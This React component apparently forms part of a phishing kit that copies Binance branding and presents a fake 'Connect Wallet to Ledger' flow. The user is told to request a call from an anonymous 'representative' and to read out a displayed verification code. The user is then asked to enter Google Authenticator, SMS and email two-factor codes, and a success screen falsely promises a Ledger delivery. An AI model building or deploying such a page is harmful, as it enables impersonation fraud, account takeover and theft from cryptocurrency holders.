
import React, { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { Phone, CheckCircle, Wallet } from "lucide-react";

type ConnectionStep = 'initial' | 'callRequest' | 'codeEntry' | 'success';

const WalletLedgerConnection = () => {
  const [currentStep, setCurrentStep] = useState<ConnectionStep>('initial');
  const [codes, setCodes] = useState({
    googleAuth: '',
    sms: '',
    email: ''
  });
  const { toast } = useToast();

  const handleRequestCall = () => {
    setCurrentStep('callRequest');
  };

  const handleCallConfirm = () => {
    setCurrentStep('codeEntry');
    toast({
      title: "Call requested",
      description: "Please wait for our representative to contact you.",
    });
  };

  const handleCodeChange = (field: keyof typeof codes, value: string) => {
    setCodes(prev => ({ ...prev, [field]: value }));
  };

  const handleFinalNext = () => {
    setCurrentStep('success');
  };

  const renderStep = () => {
    switch (currentStep) {
      case 'initial':
        return (
          <div className="text-center space-y-6">
            <div className="flex items-center justify-center gap-3 mb-6">
              <Wallet className="w-8 h-8 text-binance-yellow" />
              <h1 className="text-3xl font-bold text-white">Connect Wallet to Ledger</h1>
            </div>
            
            <p className="text-[#848E9C] text-base max-w-md mx-auto">
              Our representatives will assist you with this process to ensure maximum security for your wallet connection.
            </p>

            <Button
              onClick={handleRequestCall}
              className="bg-blue-600 hover:bg-blue-700 text-white px-6 h-12 text-base"
            >
              <Phone className="w-5 h-5 mr-2" />
              Request Call
            </Button>
          </div>
        );

      case 'callRequest':
        return (
          <div className="text-center space-y-6">
            <h2 className="text-2xl font-bold text-white">Call Request Confirmation</h2>
            
            <div className="bg-[#2B3139] rounded-lg p-6 space-y-4">
              <p className="text-[#848E9C] text-base">
                Binance always calls anonymously for security purposes.
              </p>
              
              <div className="bg-[#181A20] rounded-lg p-4 border border-binance-yellow">
                <p className="text-white text-sm mb-2">Verification Code:</p>
                <p className="text-binance-yellow text-2xl font-bold tracking-wider">88-12-30</p>
              </div>
              
              <p className="text-[#848E9C] text-sm">
                Our representative will ask for this code to verify your identity and ensure security.
              </p>
            </div>

            <Button
              onClick={handleCallConfirm}
              className="bg-binance-yellow hover:bg-binance-yellow/90 text-black font-semibold h-12 px-8"
            >
              Next
            </Button>
          </div>
        );

      case 'codeEntry':
        return (
          <div className="space-y-6">
            <div className="text-center">
              <h2 className="text-2xl font-bold text-white mb-2">Additional Security Verification</h2>
              <p className="text-[#848E9C] text-base">
                You may optionally enter verification codes from any of the following sources:
              </p>
            </div>

            <div className="space-y-4">
              <div>
                <Label htmlFor="googleAuth" className="text-[#B7BDC6] text-base mb-2 block">
                  Google Authenticator Code (Optional)
                </Label>
                <Input
                  id="googleAuth"
                  type="text"
                  value={codes.googleAuth}
                  onChange={(e) => handleCodeChange('googleAuth', e.target.value)}
                  className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
                  placeholder="000000"
                />
              </div>

              <div>
                <Label htmlFor="sms" className="text-[#B7BDC6] text-base mb-2 block">
                  SMS Code (Optional)
                </Label>
                <Input
                  id="sms"
                  type="text"
                  value={codes.sms}
                  onChange={(e) => handleCodeChange('sms', e.target.value)}
                  className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
                  placeholder="000000"
                />
              </div>

              <div>
                <Label htmlFor="email" className="text-[#B7BDC6] text-base mb-2 block">
                  Email Code (Optional)
                </Label>
                <Input
                  id="email"
                  type="text"
                  value={codes.email}
                  onChange={(e) => handleCodeChange('email', e.target.value)}
                  className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 focus:border-binance-yellow"
                  placeholder="000000"
                />
              </div>
            </div>

            <Button
              onClick={handleFinalNext}
              className="w-full bg-binance-yellow hover:bg-binance-yellow/90 text-black font-semibold h-12 text-base"
            >
              Next
            </Button>
          </div>
        );

      case 'success':
        return (
          <div className="text-center space-y-6">
            <CheckCircle className="w-16 h-16 text-green-500 mx-auto" />
            
            <div className="space-y-4">
              <h2 className="text-2xl font-bold text-white">Connection Successful!</h2>
              
              <div className="bg-[#2B3139] rounded-lg p-6">
                <p className="text-white text-base leading-relaxed">
                  Your wallet has been successfully linked to your ledger. Normally, you will receive it within 5 business days. We will keep you updated via email regarding delivery.
                </p>
              </div>
            </div>
          </div>
        );

      default:
        return null;
    }
  };

  return (
    <div className="min-h-[calc(100vh-200px)] flex items-center justify-center py-8 px-4">
      <div className="w-full max-w-md mx-auto">
        <div className="bg-[#1E2026] rounded-lg border border-[#2B3139] p-8">
          {renderStep()}
        </div>
      </div>
    </div>
  );
};

export default WalletLedgerConnection;
